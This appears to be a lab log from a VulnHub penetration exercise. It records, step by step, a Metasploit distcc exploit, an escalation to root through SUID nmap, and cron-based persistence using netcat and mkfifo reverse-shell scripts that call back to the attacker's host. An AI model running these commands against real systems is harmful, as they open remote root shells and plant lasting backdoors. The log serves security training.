# Privilege Escalation & Persistence Lab Log

**Date:** 2025-12-03  
**Attacker IP:** 192.168.0.9  
**Target IP:** 192.168.0.14  
**Machine:** VulnHub Linux Target

---

## 1. Initial Access

| Time     | Action/Activity              | Tools & Commands Used                                                                                                                       | Result                      |
| -------- | ---------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- |
| 09:40 AM | Attempt initial exploitation | `use exploit/unix/misc/distcc_exec`<br>`set RHOSTS 192.168.0.14`<br>`set LHOST 192.168.0.9`<br>`set PAYLOAD cmd/unix/reverse_perl`<br>`run` | Reverse shell obtained      |
| 09:41 AM | Handler started              | `Started reverse TCP handler on 192.168.0.9:4444`                                                                                           | Session opened successfully |

---

## 2. Enumeration

| Time     | Task                             | Commands Executed                 | Key Findings                    |
| -------- | -------------------------------- | --------------------------------- | ------------------------------- |
| 09:55 AM | Service Enumeration              | `nmap -sV -sC -p- 192.168.0.14`   | Open ports identified           |
| 10:00 AM | Vulnerability Scan               | `nmap --script vuln 192.168.0.14` | distcc exploitation confirmed   |
| 10:10 AM | Privilege Escalation Enumeration | `./linpeas.sh`                    | **SUID binary detected → nmap** |

---

## 3. Privilege Escalation

| Time     | Method Used           | Commands Executed                         | Outcome                         |
| -------- | --------------------- | ----------------------------------------- | ------------------------------- |
| 10:25 AM | SUID Exploit via Nmap | `nmap --interactive`<br>`!sh`<br>`whoami` | Privilege escalated to **root** |
| 10:30 AM | Confirmation          | `id`, `hostname`, `pwd`                   | Root access verified            |

---

## 4. Persistence Establishment

| Time     | Action                                 | Commands                                                                            | Status                 |
| -------- | -------------------------------------- | ----------------------------------------------------------------------------------- | ---------------------- | ----------------------------------------------------------------------- | --------------------------------- |
| 10:50 AM | Create reverse shell script            | `echo "nc -e /bin/bash 192.168.0.9 4444" > /tmp/back.sh`<br>`chmod +x /tmp/back.sh` | Script created         |
| 11:00 AM | Add Cron Persistence                   | `echo "* * * * * root /tmp/back.sh" >> /etc/crontab`<br>`service cron restart`      | Cron persistence added |
| 11:10 AM | Reliable persistence alternate payload | `echo -e '#!/bin/bash\nrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f                      | /bin/bash -i 2>&1      | nc 192.168.0.9 5555 >/tmp/f' > /root/rev.sh`<br>`chmod +x /root/rev.sh` | Stable persistence option enabled |

---

## 5. Verification

| Time     | Check Performed             | Verified Output                         |
| -------- | --------------------------- | --------------------------------------- |
| 11:30 AM | Started listener            | Reverse shell received                  |
| 11:32 AM | Cron execution confirmation | Persistent shell triggered successfully |

---

## Final Status

| Objective            | Status      | Notes                        |
| -------------------- | ----------- | ---------------------------- |
| Privilege Escalation | ✔ Success   | Root via SUID Nmap           |
| Persistence          | ✔ Success   | Cron + backdoor shell active |
| Documentation        | ✔ Completed | Lab deliverables ready       |

---
